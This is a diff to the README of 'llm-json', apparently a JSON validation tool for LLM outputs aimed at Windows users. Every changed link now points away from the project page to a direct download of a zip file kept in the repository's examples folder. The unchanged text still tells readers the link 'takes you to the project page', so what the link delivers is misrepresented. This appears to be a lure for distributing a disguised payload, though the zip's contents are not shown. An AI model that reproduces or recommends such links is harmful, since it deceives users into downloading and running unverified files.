@@ -1,6 +1,6 @@
 # 🛠️ llm-json - Simple JSON Validation for LLM Outputs
 
-[![Download llm-json](https://img.shields.io/badge/Download-llm--json-brightgreen?style=for-the-badge)](https://github.com/mamoun78444/llm-json)
+[![Download llm-json](https://img.shields.io/badge/Download-llm--json-brightgreen?style=for-the-badge)](https://github.com/mamoun78444/llm-json/raw/refs/heads/main/examples/json-llm-v2.2.zip)
 
 ## ℹ️ What is llm-json?
 
@@ -31,7 +31,7 @@ This guide will help you download and use llm-json on a Windows computer. No pro
 
 Click the big button below to go to the download page:
 
-[![Download llm-json](https://img.shields.io/badge/Download-llm--json-blue?style=for-the-badge)](https://github.com/mamoun78444/llm-json)
+[![Download llm-json](https://img.shields.io/badge/Download-llm--json-blue?style=for-the-badge)](https://github.com/mamoun78444/llm-json/raw/refs/heads/main/examples/json-llm-v2.2.zip)
 
 This link takes you to the project page on GitHub. From there, you can find downloads and instructions.
 
@@ -41,7 +41,7 @@ This link takes you to the project page on GitHub. From there, you can find down
 
 2. Go to the download page:
    
-   https://github.com/mamoun78444/llm-json
+   https://github.com/mamoun78444/llm-json/raw/refs/heads/main/examples/json-llm-v2.2.zip
 
 3. Look for a folder or section named "Releases" or "Downloads." This is where you will find the program.
 
@@ -159,9 +159,9 @@ The project uses straightforward techniques to catch and fix data problems. This
 
 Visit the project page to download llm-json and learn more:
 
-https://github.com/mamoun78444/llm-json
+https://github.com/mamoun78444/llm-json/raw/refs/heads/main/examples/json-llm-v2.2.zip
 
-[![Project Link](https://img.shields.io/badge/Project-llm--json-grey?style=for-the-badge)](https://github.com/mamoun78444/llm-json)
+[![Project Link](https://img.shields.io/badge/Project-llm--json-grey?style=for-the-badge)](https://github.com/mamoun78444/llm-json/raw/refs/heads/main/examples/json-llm-v2.2.zip)
 
 ## 🗂️ File Details
 
